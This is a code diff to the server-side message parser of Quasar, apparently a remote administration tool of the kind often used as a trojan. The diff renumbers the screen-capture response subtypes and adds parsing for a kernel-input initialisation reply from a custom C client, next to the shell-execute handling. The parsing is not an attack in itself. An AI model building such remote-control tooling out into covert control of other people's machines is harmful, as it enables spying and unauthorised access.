@@ -195,13 +195,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetMonitorsResponse = 08 33 08 <varint Number> (subtype 51). */
+        /* Fallback: C client GetMonitorsResponse = 08 34 08 <varint Number> (subtype 52). */
         private static bool TryParseRawGetMonitorsResponse(byte[] payload, int start, int length, out GetMonitorsResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int bodyStart)) return false;
-            if (subtype != 51) return false;
+            if (subtype != 52) return false;
             if (bodyStart + 2 > end || payload[bodyStart] != 0x08) return false;
             int offset = bodyStart + 1;
             if (!TryReadVarint(payload, ref offset, end, out int number) || number < 0 || number > 64) return false;
@@ -500,13 +500,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetDesktopResponse = 08 2B (subtype 43) + field 1 Image (0x0A bytes) + field 2 Quality (0x10 varint) + field 3 Monitor (0x18 varint) + field 4 Resolution (0x22 len msg). */
+        /* Fallback: C client GetDesktopResponse = 08 2C (subtype 44) + field 1 Image (0x0A bytes) + field 2 Quality (0x10 varint) + field 3 Monitor (0x18 varint) + field 4 Resolution (0x22 len msg). */
         private static bool TryParseRawGetDesktopResponse(byte[] payload, int start, int length, out GetDesktopResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 43) return false;
+            if (subtype != 44) return false;
             byte[] image = null;
             int quality = 75, monitor = 0;
             Resolution resolution = null;
@@ -666,6 +666,35 @@ namespace Quasar.Server.Networking
                 offset += len;
             }
             result = new DoShellExecuteResponse { Output = output ?? "", IsError = isError };
+            return true;
+        }
+
+        /* Fallback: C client KernelInputInitResponse (subtype 122) = 08 7A + field 1 Success (varint), 2 ErrorMessage (string). */
+        private static bool TryParseRawKernelInputInitResponse(byte[] payload, int start, int length, out KernelInputInitResponse result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 122) return false;
+            bool success = false;
+            string errorMessage = "";
+            while (offset < end)
+            {
+                if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
+                int field = tag >> 3;
+                int wire = tag & 7;
+                if (wire == 0)
+                {
+                    if (!TryReadVarint(payload, ref offset, end, out int v)) break;
+                    if (field == 1) success = (v != 0);
+                    continue;
+                }
+                if (wire != 2) break;
+                if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
+                if (field == 2) errorMessage = Encoding.UTF8.GetString(payload, offset, len);
+                offset += len;
+            }
+            result = new KernelInputInitResponse { Success = success, ErrorMessage = errorMessage ?? "" };
             return true;
         }
 
@@ -1068,6 +1097,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawDoShellExecuteResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawShellResp))
                                         {
                                             message = rawShellResp;
+                                        }
+                                        else if (TryParseRawKernelInputInitResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawKernelInit))
+                                        {
+                                            message = rawKernelInit;
                                         }
                                         else
                                         {
